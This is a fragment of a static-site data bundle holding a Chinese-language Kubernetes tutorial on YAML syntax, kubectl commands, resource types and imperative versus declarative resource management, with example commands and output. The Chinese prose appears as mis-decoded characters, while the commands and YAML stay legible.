n392\n393\n394\n395\n396\n397\n398\n399\n400\n401\n402\n403\n404\n405\n406\n407\n408\n409\n410\n411\n412\n413\n414\n415\n416\n417\n418\n419\n420\n421\n422\n423\n424\n425\n426\n427\n428\n429\n430\n431\n432\n433\n434\n435\n436\n437\n438\n439\n440\n441\n442\n443\n444\n445\n446\n447\n448\n449\n450\n451\n452\n453\n454\n455\n456\n457\n458\n459\n460\n461\n462\n463\n464\n465\n466\n467\n468\n469\n470\n471\n472\n473\n474\n475\n476\n477\n478\n479\n480\n481\n482\n483\n484\n485\n486\n487\n488\n489\n490\n491\n492\n493\n494\n495\n496\n497\n498\n499\n500\n501\n502\n503\n504\n505\n506\n507\n508\n509\n510\n511\n512\n513\n514\n515\n516\n517\n518\n519\n520\n521\n522\n523\n524\n525\n526\n527\n528\n529\n530\n531\n532\n533\n534\n535\n536\n537\n538\n539\n540\n541\n542\n543\n544\n545\n546\n547\n548\n549\n550\n551\n552\n553\n554\n555\n556\n557\n558\n559\n560\n561\n562\n563\n564\n565\n566\n567\n568\n569\n570\n571\n572\n573\n574\n575\n576\n577\n578\n579\n580\n581\n582\n583\n584\n585\n586\n587\n588\n589\n590\n591\n592\n593\n594\n595\n596\n597\n598\n599\n600\n601\n602\n603\n604\n\n\næ§è¡ä»¥ä¸å½ä»¤\n\nkubectl apply -f kube-flannel.yml \n\n\n1\n\n\næ¥çèç¹ç¶æï¼åªè¦ä» notready å° ready å°±ç®æå\n\n\n# æå¡é¨ç½²\n\né¨ç½²ä¸ä¸ª nginx ç¨åºï¼æµè¯ä¸éç¾¤æ¯å¦å¨æ­£å¸¸å·¥ä½ï¼ç´æ¥å¨ master æä½\n\n# é¨ç½²nginx\nkubectl create deployment nginx --image=nginx:1.14-alpine\n# æ´é²ç«¯å£\nkubectl expose deployment nginx --port=80 --type=nodeport\n\n# æ¥çæå¡ç¶æ\n[root@localhost package]# kubectl get pods,svc\nname                         ready   status    restarts   age\npod/nginx-6867cdf567-2l7tr   1/1     running   0          50s\n\nname                 type        cluster-ip       external-ip   port(s)        age\nservice/kubernetes   clusterip   10.96.0.1        <none>        443/tcp        71m\nservice/nginx        nodeport    10.101.119.180   <none>        80:31543/tcp   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n31543 è¿ä¸ªç«¯å£å°±æ¯å¤é¨ç«¯å£ï¼å¯ä»¥éè¿èç¹åç§° + ç«¯å£å·ç´æ¥è®¿é®æµè¯',charsets:{cjk:!0}},{title:"kubernetes(ä¸) èµæºç®¡ç",frontmatter:{title:"kubernetes(ä¸) èµæºç®¡ç",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/602",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/602.kubernetes(%E4%B8%89)%20%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86.html",relativePath:"04.è¿ç»´/60.Kubernetes/602.kubernetes(ä¸) èµæºç®¡ç.md",key:"v-1cf8c197",path:"/kubernetes/602/",headers:[{level:2,title:"èµæºç®¡çä»ç»",slug:"èµæºç®¡çä»ç»",normalizedTitle:"èµæºç®¡çä»ç»",charIndex:2},{level:2,title:"YAMLè¯­è¨ä»ç»",slug:"yamlè¯­è¨ä»ç»",normalizedTitle:"yaml è¯­è¨ä»ç»",charIndex:448},{level:2,title:"èµæºç®¡çæ¹å¼",slug:"èµæºç®¡çæ¹å¼",normalizedTitle:"èµæºç®¡çæ¹å¼",charIndex:1715},{level:3,title:"å½ä»¤å¼å¯¹è±¡ç®¡ç",slug:"å½ä»¤å¼å¯¹è±¡ç®¡ç",normalizedTitle:"å½ä»¤å¼å¯¹è±¡ç®¡ç",charIndex:1726},{level:4,title:"kubectlå½ä»¤",slug:"kubectlå½ä»¤",normalizedTitle:"kubectl å½ä»¤",charIndex:2174},{level:4,title:"èµæºç±»å",slug:"èµæºç±»å",normalizedTitle:"èµæºç±»å",charIndex:2368},{level:4,title:"æä½",slug:"æä½",normalizedTitle:"æä½",charIndex:43},{level:3,title:"å½ä»¤å¼å¯¹è±¡éç½®",slug:"å½ä»¤å¼å¯¹è±¡éç½®",normalizedTitle:"å½ä»¤å¼å¯¹è±¡éç½®",charIndex:1817},{level:3,title:"å£°æå¼å¯¹è±¡éç½®",slug:"å£°æå¼å¯¹è±¡éç½®",normalizedTitle:"å£°æå¼å¯¹è±¡éç½®",charIndex:1899}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"èµæºç®¡çä»ç» YAMLè¯­è¨ä»ç» èµæºç®¡çæ¹å¼ å½ä»¤å¼å¯¹è±¡ç®¡ç kubectlå½ä»¤ èµæºç±»å æä½ å½ä»¤å¼å¯¹è±¡éç½® å£°æå¼å¯¹è±¡éç½®",content:'# èµæºç®¡çä»ç»\n\nå¨ kubernetes ä¸­ï¼ææçåå®¹é½æ½è±¡ä¸ºèµæºï¼ç¨æ·éè¦éè¿æä½èµæºæ¥ç®¡ç kubernetesã\n\n> kubernetes çæ¬è´¨ä¸å°±æ¯ä¸ä¸ªéç¾¤ç³»ç»ï¼ç¨æ·å¯ä»¥å¨éç¾¤ä¸­é¨ç½²åç§æå¡ï¼æè°çé¨ç½²æå¡ï¼å¶å®å°±æ¯å¨ kubernetes éç¾¤ä¸­è¿è¡ä¸ä¸ªä¸ªçå®¹å¨ï¼å¹¶å°æå®çç¨åºè·å¨å®¹å¨ä¸­ã\n> \n> kubernetes çæå°ç®¡çååæ¯ pod èä¸æ¯å®¹å¨ï¼æä»¥åªè½å°å®¹å¨æ¾å¨ Pod ä¸­ï¼è kubernetes ä¸è¬ä¹ä¸ä¼ç´æ¥ç®¡ç Podï¼èæ¯éè¿ Podæ§å¶å¨ æ¥ç®¡ç Pod çã\n> \n> Pod å¯ä»¥æä¾æå¡ä¹åï¼å°±è¦èèå¦ä½è®¿é® Pod ä¸­æå¡ï¼kubernetes æä¾äº Service èµæºå®ç°è¿ä¸ªåè½ã\n> \n> å½ç¶ï¼å¦æ Pod ä¸­ç¨åºçæ°æ®éè¦æä¹åï¼kubernetes è¿æä¾äºåç§ å­å¨ ç³»ç»ã\n\n\n\n> å­¦ä¹  kubernetes çæ ¸å¿ï¼å°±æ¯å­¦ä¹ å¦ä½å¯¹éç¾¤ä¸ç PodãPodæ§å¶å¨ãServiceãå­å¨ ç­åç§èµæºè¿è¡æä½\n\n\n# YAML è¯­è¨ä»ç»\n\nYAML æ¯ä¸ä¸ªç±»ä¼¼ XMLãJSON çæ è®°æ§è¯­è¨ãå®å¼ºè°ä»¥æ°æ®ä¸ºä¸­å¿ï¼å¹¶ä¸æ¯ä»¥æ è¯è¯­è¨ä¸ºéç¹ãå è YAML æ¬èº«çå®ä¹æ¯è¾ç®åï¼å·ç§° "ä¸ç§äººæ§åçæ°æ®æ ¼å¼è¯­è¨"ã\n\n# xml è¯­æ³ æ htmlè¯­æ³\n<heima>\n    <age>15</age>\n    <address>Beijing</address>\n</heima>\n\n\n1\n2\n3\n4\n5\n\n\n# yaml è¯­æ³\nheima:\n  age: 15\n  address: Beijing\n\n\n1\n2\n3\n4\n\n\nYAML çè¯­æ³æ¯è¾ç®åï¼ä¸»è¦æä¸é¢å ä¸ªï¼\n\n * å¤§å°åææ\n * ä½¿ç¨ç¼©è¿è¡¨ç¤ºå±çº§å³ç³»\n * ç¼©è¿ä¸åè®¸ä½¿ç¨ tabï¼åªåè®¸ç©ºæ ¼ (ä½çæ¬éå¶)\n * ç¼©è¿çç©ºæ ¼æ°ä¸éè¦ï¼åªè¦ç¸åå±çº§çåç´ å·¦å¯¹é½å³å¯\n * \'#\' è¡¨ç¤ºæ³¨é\n\nYAML æ¯æä»¥ä¸å ç§æ°æ®ç±»åï¼\n\n * çº¯éï¼åä¸ªçãä¸å¯ååçå¼\n * å¯¹è±¡ï¼é®å¼å¯¹çéåï¼åç§°ä¸ºæ å°ï¼mappingï¼/ åå¸ï¼hashï¼ / å­å¸ï¼dictionaryï¼\n * æ°ç»ï¼ä¸ç»ææ¬¡åºæåçå¼ï¼åç§°ä¸ºåºåï¼sequenceï¼ / åè¡¨ï¼listï¼\n\n# çº¯é, å°±æ¯æçä¸ä¸ªç®åçå¼ï¼å­ç¬¦ä¸²ãå¸å°å¼ãæ´æ°ãæµ®ç¹æ°ãNullãæ¶é´ãæ¥æ\n# 1 å¸å°ç±»å\nc1: true (æèTrue)\n# 2 æ´å\nc2: 234\n# 3 æµ®ç¹å\nc3: 3.14\n# 4 nullç±»å \nc4: ~  # ä½¿ç¨~è¡¨ç¤ºnull\n# 5 æ¥æç±»å\nc5: 2018-02-17    # æ¥æå¿é¡»ä½¿ç¨ISO 8601æ ¼å¼ï¼å³yyyy-MM-dd\n# 6 æ¶é´ç±»å\nc6: 2018-02-17T15:02:31+08:00  # æ¶é´ä½¿ç¨ISO 8601æ ¼å¼ï¼æ¶é´åæ¥æä¹é´ä½¿ç¨Tè¿æ¥ï¼æåä½¿ç¨+ä»£è¡¨æ¶åº\n# 7 å­ç¬¦ä¸²ç±»å\nc7: heima     # ç®ååæ³ï¼ç´æ¥åå¼ , å¦æå­ç¬¦ä¸²ä¸­é´æç¹æ®å­ç¬¦ï¼å¿é¡»ä½¿ç¨åå¼å·æèåå¼å·åè£¹ \nc8: line1\n    line2     # å­ç¬¦ä¸²è¿å¤çæåµå¯ä»¥ææå¤è¡ï¼æ¯ä¸è¡ä¼è¢«è½¬åæä¸ä¸ªç©ºæ ¼\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# å¯¹è±¡\n# å½¢å¼ä¸(æ¨è):\nheima:\n  age: 15\n  address: Beijing\n# å½¢å¼äº(äºè§£):\nheima: {age: 15,address: Beijing}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# æ°ç»\n# å½¢å¼ä¸(æ¨è):\naddress:\n  - é¡ºä¹\n  - æå¹³  \n# å½¢å¼äº(äºè§£):\naddress: [é¡ºä¹,æå¹³]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> å°æç¤ºï¼\n> 1 ä¹¦å yaml åè®° : åé¢è¦å ä¸ä¸ªç©ºæ ¼\n> 2 å¦æéè¦å°å¤æ®µ yaml éç½®æ¾å¨ä¸ä¸ªæä»¶ä¸­ï¼ä¸­é´è¦ä½¿ç¨ --- åé\n> 3 ä¸é¢æ¯ä¸ä¸ª yaml è½¬ json çç½ç«ï¼å¯ä»¥éè¿å®éªè¯ yaml æ¯å¦ä¹¦åæ­£ç¡®\n\n\n# èµæºç®¡çæ¹å¼\n\n * å½ä»¤å¼å¯¹è±¡ç®¡çï¼ç´æ¥ä½¿ç¨å½ä»¤å»æä½ kubernetes èµæº\n   kubectl run nginx-pod --image=nginx:1.17.1 --port=80\n * å½ä»¤å¼å¯¹è±¡éç½®ï¼éè¿å½ä»¤éç½®åéç½®æä»¶å»æä½ kubernetes èµæº\n   kubectl create/patch -f nginx-pod.yaml\n * å£°æå¼å¯¹è±¡éç½®ï¼éè¿ apply å½ä»¤åéç½®æä»¶å»æä½ kubernetes èµæº\n   kubectl apply -f nginx-pod.yaml\n\nç±»å        æä½å¯¹è±¡   éç¨ç¯å¢   ä¼ç¹        ç¼ºç¹\nå½ä»¤å¼å¯¹è±¡ç®¡ç   å¯¹è±¡     æµè¯     ç®å        åªè½æä½æ´»å¨å¯¹è±¡ï¼æ æ³å®¡è®¡ãè·è¸ª\nå½ä»¤å¼å¯¹è±¡éç½®   æä»¶     å¼å     å¯ä»¥å®¡è®¡ãè·è¸ª   é¡¹ç®å¤§æ¶ï¼éç½®æä»¶å¤ï¼æä½éº»ç¦\nå£°æå¼å¯¹è±¡éç½®   ç®å½     å¼å     æ¯æç®å½æä½    æå¤æåµä¸é¾ä»¥è°è¯\n\n\n# å½ä»¤å¼å¯¹è±¡ç®¡ç\n\n# kubectl å½ä»¤\n\nkubectl æ¯ kubernetes éç¾¤çå½ä»¤è¡å·¥å·ï¼éè¿å®è½å¤å¯¹éç¾¤æ¬èº«è¿è¡ç®¡çï¼å¹¶è½å¤å¨éç¾¤ä¸è¿è¡å®¹å¨ååºç¨çå®è£é¨ç½²ãkubectl å½ä»¤çè¯­æ³å¦ä¸ï¼\n\nkubectl [command] [type] [name] [flags]\n\n\n1\n\n * commandï¼æå®è¦å¯¹èµæºæ§è¡çæä½ï¼ä¾å¦ createãgetãdelete\n * typeï¼æå®èµæºç±»åï¼æ¯å¦ deploymentãpodãservice\n * nameï¼æå®èµæºçåç§°ï¼åç§°å¤§å°åææ\n * flagsï¼æå®é¢å¤çå¯éåæ°\n\n# æ¥çææpod\nkubectl get pod \n\n# æ¥çæä¸ªpod\nkubectl get pod pod_name\n\n# æ¥çæä¸ªpod,ä»¥yamlæ ¼å¼å±ç¤ºç»æ\nkubectl get pod pod_name -o yaml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# èµæºç±»å\n\nkubernetes ä¸­ææçåå®¹é½æ½è±¡ä¸ºèµæºï¼å¯ä»¥éè¿ä¸é¢çå½ä»¤è¿è¡æ¥ç:\n\nkubectl api-resources\n\n\n1\n\n\nç»å¸¸ä½¿ç¨çèµæºæä¸é¢è¿äºï¼\n\nèµæºåç±»         èµæºåç§°                       ç¼©å       èµæºä½ç¨\néç¾¤çº§å«èµæº       nodes                      no       éç¾¤ç»æé¨å\nnamespaces   ns                         éç¦» Pod   \npod èµæº       pods                       po       è£è½½å®¹å¨\npod èµæºæ§å¶å¨    replicationcontrollers     rc       æ§å¶ pod èµæº\n             replicasets                rs       æ§å¶ pod èµæº\n             deployments                deploy   æ§å¶ pod èµæº\n             daemonsets                 ds       æ§å¶ pod èµæº\n             jobs                                æ§å¶ pod èµæº\n             cronjobs                   cj       æ§å¶ pod èµæº\n             horizontalpodautoscalers   hpa      æ§å¶ pod èµæº\n             statefulsets               sts      æ§å¶ pod èµæº\næå¡åç°èµæº       services                   svc      ç»ä¸ pod å¯¹å¤æ¥å£\n             ingress                    ing      ç»ä¸ pod å¯¹å¤æ¥å£\nå­å¨èµæº         volumeattachments                   å­å¨\n             persistentvolumes          pv       å­å¨\n             persistentvolumeclaims     pvc      å­å¨\néç½®èµæº         configmaps                 cm       éç½®\n             secrets                             éç½®\n\n# æä½\n\nkubernetes åè®¸å¯¹èµæºè¿è¡å¤ç§æä½ï¼å¯ä»¥éè¿ --help æ¥çè¯¦ç»çæä½å½ä»¤\n\nkubectl --help\n\n\n1\n\n\nç»å¸¸ä½¿ç¨çæä½æä¸é¢è¿äºï¼\n\nå½ä»¤åç±»    å½ä»¤             ç¿»è¯                 å½ä»¤ä½ç¨\nåºæ¬å½ä»¤    create         åå»º                 åå»ºä¸ä¸ªèµæº\n        edit           ç¼è¾                 ç¼è¾ä¸ä¸ªèµæº\n        get            è·å                 è·åä¸ä¸ªèµæº\n        patch          æ´æ°                 æ´æ°ä¸ä¸ªèµæº\n        delete         å é¤                 å é¤ä¸ä¸ªèµæº\n        explain        è§£é                 å±ç¤ºèµæºææ¡£\nè¿è¡åè°è¯   run            è¿è¡                 å¨éç¾¤ä¸­è¿è¡ä¸ä¸ªæå®çéå\n        expose         æ´é²                 æ´é²èµæºä¸º Service\n        describe       æè¿°                 æ¾ç¤ºèµæºåé¨ä¿¡æ¯\n        logs           æ¥å¿è¾åºå®¹å¨å¨ pod ä¸­çæ¥å¿   è¾åºå®¹å¨å¨ pod ä¸­çæ¥å¿\n        attach         ç¼ ç»è¿å¥è¿è¡ä¸­çå®¹å¨         è¿å¥è¿è¡ä¸­çå®¹å¨\n        exec           æ§è¡å®¹å¨ä¸­çä¸ä¸ªå½ä»¤         æ§è¡å®¹å¨ä¸­çä¸ä¸ªå½ä»¤\n        cp             å¤å¶                 å¨ Pod åå¤å¤å¶æä»¶\n        rollout        é¦æ¬¡å±ç¤º               ç®¡çèµæºçåå¸\n        scale          è§æ¨¡                 æ© (ç¼©) å®¹ Pod çæ°é\n        autoscale      èªå¨è°æ´               èªå¨è°æ´ Pod çæ°é\né«çº§å½ä»¤    apply          rc                 éè¿æä»¶å¯¹èµæºè¿è¡éç½®\n        label          æ ç­¾                 æ´æ°èµæºä¸çæ ç­¾\nå¶ä»å½ä»¤    cluster-info   éç¾¤ä¿¡æ¯               æ¾ç¤ºéç¾¤ä¿¡æ¯\n        version        çæ¬                 æ¾ç¤ºå½å Server å Client ççæ¬\n\nä¸é¢ä»¥ä¸ä¸ª namespace /pod çåå»ºåå é¤ç®åæ¼ç¤ºä¸å½ä»¤çä½¿ç¨ï¼\n\n# åå»ºä¸ä¸ªnamespace\n[root@master ~]# kubectl create namespace dev\nnamespace/dev created\n\n# è·ånamespace\n[root@master ~]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   21h\ndev               Active   21s\nkube-node-lease   Active   21h\nkube-public       Active   21h\nkube-system       Active   21h\n\n# å¨æ­¤namespaceä¸åå»ºå¹¶è¿è¡ä¸ä¸ªnginxçPod\n[root@master ~]# kubectl run pod --image=nginx:latest -n dev\nkubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead.\ndeployment.apps/pod created\n\n# æ¥çæ°åå»ºçpod\n[root@master ~]# kubectl get pod -n dev\nNAME  READY   STATUS    RESTARTS   AGE\npod   1/1     Running   0          21s\n\n# å é¤æå®çpod\n[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x\npod "pod" deleted\n\n# å é¤æå®çnamespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# å½ä»¤å¼å¯¹è±¡éç½®\n\nå½ä»¤å¼å¯¹è±¡éç½®å°±æ¯ä½¿ç¨å½ä»¤éåéç½®æä»¶ä¸èµ·æ¥æä½ kubernetes èµæºã\n1ï¼ åå»ºä¸ä¸ª nginxpod.yamlï¼åå®¹å¦ä¸ï¼\n\n# çæ¬\napiVersion: v1\n# ç±»å\nkind: Namespace\n# åæ°æ®\nmetadata:\n  # åç§°\n  name: dev\n\n---\n\napiVersion: v1\nkind: Pod\nmetadata:\n  # åç§°\n  name: nginxpod\n  # æå¨å½åç©ºé´\n  namespace: dev\n# è¯¦ç»æè¿°\nspec:\n  containers:\n  # å®¹å¨çåå­\n  - name: nginx-containers\n    # å®¹å¨æç¨çéå\n    image: nginx:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n2ï¼æ§è¡ create å½ä»¤ï¼åå»ºèµæºï¼\n\n[root@master ~]# kubectl create -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n\n1\n2\n3\n\n\næ­¤æ¶åç°åå»ºäºä¸¤ä¸ªèµæºå¯¹è±¡ï¼åå«æ¯ namespace å pod\n\n3ï¼æ§è¡ get å½ä»¤ï¼æ¥çèµæºï¼\n\n[root@master ~]#  kubectl get -f nginxpod.yaml\nNAME            STATUS   AGE\nnamespace/dev   Active   18s\n\nNAME            READY   STATUS    RESTARTS   AGE\npod/nginxpod    1/1     Running   0          17s\n\n\n1\n2\n3\n4\n5\n6\n\n\nè¿æ ·å°±æ¾ç¤ºäºä¸¤ä¸ªèµæºå¯¹è±¡çä¿¡æ¯\n\n4ï¼æ§è¡ delete å½ä»¤ï¼å é¤èµæºï¼\n\n[root@master ~]# kubectl delete -f nginxpod.yaml\nnamespace "dev" deleted\npod "nginxpod" deleted\n\n\n1\n2\n3\n\n\næ­¤æ¶åç°ä¸¤ä¸ªèµæºå¯¹è±¡è¢«å é¤äº\n\næ»ç»:\n    å½ä»¤å¼å¯¹è±¡éç½®çæ¹å¼æä½èµæºï¼å¯ä»¥ç®åçè®¤ä¸ºï¼å½ä»¤  +  yamléç½®æä»¶ï¼éé¢æ¯å½ä»¤éè¦çåç§åæ°ï¼\n\n\n1\n2\n\n\n\n# å£°æå¼å¯¹è±¡éç½®\n\nå£°æå¼å¯¹è±¡éç½®è·å½ä»¤å¼å¯¹è±¡éç½®å¾ç¸ä¼¼ï¼ä½æ¯å®åªæä¸ä¸ªå½ä»¤ applyã\n\n# é¦åæ§è¡ä¸æ¬¡kubectl apply -f yamlæä»¶ï¼åç°åå»ºäºèµæº\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n# åæ¬¡æ§è¡ä¸æ¬¡kubectl apply -f yamlæä»¶ï¼åç°è¯´èµæºæ²¡æåå¨\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev unchanged\npod/nginxpod unchanged\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ»ç»:\n    å¶å®å£°æå¼å¯¹è±¡éç½®å°±æ¯ä½¿ç¨applyæè¿°ä¸ä¸ªèµæºæç»çç¶æï¼å¨yamlä¸­å®ä¹ç¶æï¼\n    ä½¿ç¨applyæä½èµæºï¼\n        å¦æèµæºä¸å­å¨ï¼å°±åå»ºï¼ç¸å½äº kubectl create\n        å¦æèµæºå·²å­å¨ï¼å°±æ´æ°ï¼ç¸å½äº kubectl patch\n\n\n1\n2\n3\n4\n5\n\n\n> æ©å±ï¼kubectl å¯ä»¥å¨ node èç¹ä¸è¿è¡åï¼\n\nkubectl çè¿è¡æ¯éè¦è¿è¡éç½®çï¼å®çéç½®æä»¶æ¯ $HOME/.kubeï¼å¦ææ³è¦å¨ node èç¹è¿è¡æ­¤å½ä»¤ï¼éè¦å° master ä¸ç.kube æä»¶å¤å¶å° node èç¹ä¸ï¼å³å¨ master èç¹ä¸æ§è¡ä¸é¢æä½ï¼\n\nscp  -r  ~/.kube   node102:~/\n\n\n1\n\n\n> ä½¿ç¨æ¨èï¼ä¸ç§æ¹å¼åºè¯¥æä¹ç¨ï¼\n> åå»º / æ´æ°èµæº ä½¿ç¨å£°æå¼å¯¹è±¡éç½® kubectl apply -f XXX.yaml\n> å é¤èµæº ä½¿ç¨å½ä»¤å¼å¯¹è±¡éç½® kubectl delete -f XXX.yaml\n> æ¥è¯¢èµæº ä½¿ç¨å½ä»¤å¼å¯¹è±¡ç®¡ç kubectl get (describe) èµæºåç§°',normalizedContent:'# èµæºç®¡çä»ç»\n\nå¨ kubernetes ä¸­ï¼ææçåå®¹é½æ½è±¡ä¸ºèµæºï¼ç¨æ·éè¦éè¿æä½èµæºæ¥ç®¡ç kubernetesã\n\n> kubernetes çæ¬è´¨ä¸å°±æ¯ä¸ä¸ªéç¾¤ç³»ç»ï¼ç¨æ·å¯ä»¥å¨éç¾¤ä¸­é¨ç½²åç§æå¡ï¼æè°çé¨ç½²æå¡ï¼å¶å®å°±æ¯å¨ kubernetes éç¾¤ä¸­è¿è¡ä¸ä¸ªä¸ªçå®¹å¨ï¼å¹¶å°æå®çç¨åºè·å¨å®¹å¨ä¸­ã\n> \n> kubernetes çæå°ç®¡çååæ¯ pod èä¸æ¯å®¹å¨ï¼æä»¥åªè½å°å®¹å¨æ¾å¨ pod ä¸­ï¼è kubernetes ä¸è¬ä¹ä¸ä¼ç´æ¥ç®¡ç podï¼èæ¯éè¿ podæ§å¶å¨ æ¥ç®¡ç pod çã\n> \n> pod å¯ä»¥æä¾æå¡ä¹åï¼å°±è¦èèå¦ä½è®¿é® pod ä¸­æå¡ï¼kubernetes æä¾äº service èµæºå®ç°è¿ä¸ªåè½ã\n> \n> å½ç¶ï¼å¦æ pod ä¸­ç¨åºçæ°æ®éè¦æä¹åï¼kubernetes è¿æä¾äºåç§ å­å¨ ç³»ç»ã\n\n\n\n> å­¦ä¹  kubernetes çæ ¸å¿ï¼å°±æ¯å­¦ä¹ å¦ä½å¯¹éç¾¤ä¸ç podãpodæ§å¶å¨ãserviceãå­å¨ ç­åç§èµæºè¿è¡æä½\n\n\n# yaml è¯­è¨ä»ç»\n\nyaml æ¯ä¸ä¸ªç±»ä¼¼ xmlãjson çæ è®°æ§è¯­è¨ãå®å¼ºè°ä»¥æ°æ®ä¸ºä¸­å¿ï¼å¹¶ä¸æ¯ä»¥æ è¯è¯­è¨ä¸ºéç¹ãå è yaml æ¬èº«çå®ä¹æ¯è¾ç®åï¼å·ç§° "ä¸ç§äººæ§åçæ°æ®æ ¼å¼è¯­è¨"ã\n\n# xml è¯­æ³ æ htmlè¯­æ³\n<heima>\n    <age>15</age>\n    <address>beijing</address>\n</heima>\n\n\n1\n2\n3\n4\n5\n\n\n# yaml è¯­æ³\nheima:\n  age: 15\n  address: beijing\n\n\n1\n2\n3\n4\n\n\nyaml çè¯­æ³æ¯è¾ç®åï¼ä¸»è¦æä¸é¢å ä¸ªï¼\n\n * å¤§å°åææ\n * ä½¿ç¨ç¼©è¿è¡¨ç¤ºå±çº§å³ç³»\n * ç¼©è¿ä¸åè®¸ä½¿ç¨ tabï¼åªåè®¸ç©ºæ ¼ (ä½çæ¬éå¶)\n * ç¼©è¿çç©ºæ ¼æ°ä¸éè¦ï¼åªè¦ç¸åå±çº§çåç´ å·¦å¯¹é½å³å¯\n * \'#\' è¡¨ç¤ºæ³¨é\n\nyaml æ¯æä»¥ä¸å ç§æ°æ®ç±»åï¼\n\n * çº¯éï¼åä¸ªçãä¸å¯ååçå¼\n * å¯¹è±¡ï¼é®å¼å¯¹çéåï¼åç§°ä¸ºæ å°ï¼mappingï¼/ åå¸ï¼hashï¼ / å­å¸ï¼dictionaryï¼\n * æ°ç»ï¼ä¸ç»ææ¬¡åºæåçå¼ï¼åç§°ä¸ºåºåï¼sequenceï¼ / åè¡¨ï¼listï¼\n\n# çº¯é, å°±æ¯æçä¸ä¸ªç®åçå¼ï¼å­ç¬¦ä¸²ãå¸å°å¼ãæ´æ°ãæµ®ç¹æ°ãnullãæ¶é´ãæ¥æ\n# 1 å¸å°ç±»å\nc1: true (æètrue)\n# 2 æ´å\nc2: 234\n# 3 æµ®ç¹å\nc3: 3.14\n# 4 nullç±»å \nc4: ~  # ä½¿ç¨~è¡¨ç¤ºnull\n# 5 æ¥æç±»å\nc5: 2018-02-17    # æ¥æå¿é¡»ä½¿ç¨iso 8601æ ¼å¼ï¼å³yyyy-mm-dd\n# 6 æ¶é´ç±»å\nc6: 2018-02-17t15:02:31+08:00  # æ¶é´ä½¿ç¨iso 8601æ ¼å¼ï¼æ¶é´åæ¥æä¹é´ä½¿ç¨tè¿æ¥ï¼æåä½¿ç¨+ä»£è¡¨æ¶åº\n# 7 å­ç¬¦ä¸²ç±»å\nc7: heima     # ç®ååæ³ï¼ç´æ¥åå¼ , å¦æå­ç¬¦ä¸²ä¸­é´æç¹æ®å­ç¬¦ï¼å¿é¡»ä½¿ç¨åå¼å·æèåå¼å·åè£¹ \nc8: line1\n    line2     # å­ç¬¦ä¸²è¿å¤çæåµå¯ä»¥ææå¤è¡ï¼æ¯ä¸è¡ä¼è¢«è½¬åæä¸ä¸ªç©ºæ ¼\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# å¯¹è±¡\n# å½¢å¼ä¸(æ¨è):\nheima:\n  age: 15\n  address: beijing\n# å½¢å¼äº(äºè§£):\nheima: {age: 15,address: beijing}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# æ°ç»\n# å½¢å¼ä¸(æ¨è):\naddress:\n  - é¡ºä¹\n  - æå¹³  \n# å½¢å¼äº(äºè§£):\naddress: [é¡ºä¹,æå¹³]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> å°æç¤ºï¼\n> 1 ä¹¦å yaml åè®° : åé¢è¦å ä¸ä¸ªç©ºæ ¼\n> 2 å¦æéè¦å°å¤æ®µ yaml éç½®æ¾å¨ä¸ä¸ªæä»¶ä¸­ï¼ä¸­é´è¦ä½¿ç¨ --- åé\n> 3 ä¸é¢æ¯ä¸ä¸ª yaml è½¬ json çç½ç«ï¼å¯ä»¥éè¿å®éªè¯ yaml æ¯å¦ä¹¦åæ­£ç¡®\n\n\n# èµæºç®¡çæ¹å¼\n\n * å½ä»¤å¼å¯¹è±¡ç®¡çï¼ç´æ¥ä½¿ç¨å½ä»¤å»æä½ kubernetes èµæº\n   kubectl run nginx-pod --image=nginx:1.17.1 --port=80\n * å½ä»¤å¼å¯¹è±¡éç½®ï¼éè¿å½ä»¤éç½®åéç½®æä»¶å»æä½ kubernetes èµæº\n   kubectl create/patch -f nginx-pod.yaml\n * å£°æå¼å¯¹è±¡éç½®ï¼éè¿ apply å½ä»¤åéç½®æä»¶å»æä½ kubernetes èµæº\n   kubectl apply -f nginx-pod.yaml\n\nç±»å        æä½å¯¹è±¡   éç¨ç¯å¢   ä¼ç¹        ç¼ºç¹\nå½ä»¤å¼å¯¹è±¡ç®¡ç   å¯¹è±¡     æµè¯     ç®å        åªè½æä½æ´»å¨å¯¹è±¡ï¼æ æ³å®¡è®¡ãè·è¸ª\nå½ä»¤å¼å¯¹è±¡éç½®   æä»¶     å¼å     å¯ä»¥å®¡è®¡ãè·è¸ª   é¡¹ç®å¤§æ¶ï¼éç½®æä»¶å¤ï¼æä½éº»ç¦\nå£°æå¼å¯¹è±¡éç½®   ç®å½     å¼å     æ¯æç®å½æä½    æå¤æåµä¸é¾ä»¥è°è¯\n\n\n# å½ä»¤å¼å¯¹è±¡ç®¡ç\n\n# kubectl å½ä»¤\n\nkubectl æ¯ kubernetes éç¾¤çå½ä»¤è¡å·¥å